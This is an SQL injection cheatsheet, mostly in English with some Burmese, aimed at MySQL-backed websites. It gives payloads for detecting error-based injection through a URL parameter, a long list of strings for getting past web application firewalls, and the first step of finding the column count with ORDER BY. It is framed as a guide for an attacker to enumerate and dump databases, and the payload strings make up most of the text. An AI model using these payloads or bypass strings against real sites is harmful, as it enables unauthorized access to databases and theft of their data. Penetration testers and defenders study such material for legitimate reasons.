# MySQL Error based SQL Injection Cheatsheet

This is probably the easiest vulnerability along the SQL Injection attack. An attacker can enumerate and dump the MySQL database by using the SQL error messages to his advantage.

## Detecting the vulnerability

<code>https://site.com/index.php?id=1</code>

Website load successfully.

အဲ့တာကိုကျွန်တော်တို့ အနောက်ကနေ ' လေးထည့်ပေးလိုက်ရင် အောက်ကပုံစံမျိုး error message ကျလာမှာဖြစ်ပါတယ်။

<code>https://site.com/index.php?id=1'</code>

Error message show up: <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...</code>

<code>https://site.com/index.php?id=1\'</code>

Error message show up: <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...</code>

<code>https://site.com/index.php?id=1 and 0' order by 1--+</code>

ဒီလိုထည့်လိုက်ရင်တော့ website ကပုံမှန်အတိုင်း ပြန်ပြီးအလုပ်လုပ်သွားမှာဖြစ်ပါတယ်။

<code>https://site.com/index.php?id=2-1</code>

Website loads successfully.

<code>https://site.com/index.php?id=-1'</code>

Error message shows up again

<code>https://site.com/index.php?id=-1)'</code>

Error message shows up again

<code>https://site.com/index.php?id=1'-- -</code>

Website might loads successfuly, but it might shows error also

<code>https://site.com/index.php?id=1'--</code>

Website might loads successfuly, but it might shows error also

<code>https://site.com/index.php?id=1+--+</code>

Website might loads successfuly, but it might shows error also

# Bypassing WAF to detect the vulnerability (if the first methodology didn't work)
In some cases, WAF won't let you to cause errors on the website, so sending special queries might be needed to bypass WAF.

<code>https://site.com/index.php?id=1'--/**/-</code>

If no WAF Warning is shown and website loads up, we confirm the vulnerability, else try the following payloads.

<code>https://site.com/index.php?id=/^.*1'--+-.*$/</code>

<code>https://site.com/index.php?id=/*!500001'--+-*/</code>

<code>https://site.com/index.php?id=1'--/**/-</code>

<code>https://site.com/index.php?id=1'--/*--*/-</code>

<code>https://site.com/index.php?id=1'--/*&a=*/-</code>

<code>https://site.com/index.php?id=1'--/*1337*/-</code>

<code>https://site.com/index.php?id=1'--/**_**/-</code>

<code>https://site.com/index.php?id=1'--%0A-</code>

<code>https://site.com/index.php?id=1'--%0b-</code>

<code>https://site.com/index.php?id=1'--%0d%0A-</code>

<code>https://site.com/index.php?id=1'--%23%0A-</code>

<code>https://site.com/index.php?id=1'--%23foo%0D%0A-</code>

<code>https://site.com/index.php?id=1'--%23foo*%2F*bar%0D%0A-</code>

<code>https://site.com/index.php?id=1'--#qa%0A#%0A-</code>

<code>https://site.com/index.php?id=/*!20000%0d%0a1'--+-*/</code>

<code>https://site.com/index.php?id=/*!blobblobblob%0d%0a1'--+-*/</code>

## Find the number of columns using 'ORDER BY' query
Now that we performed an SQL syntax error to the website, we can begin fuzzing and finding how many columns do we have by using ORDER BY

<code>https://site.com/index.php?id=1' order by 1-- -</code> 

This query musn't shows up error, since there is no lower number than 1

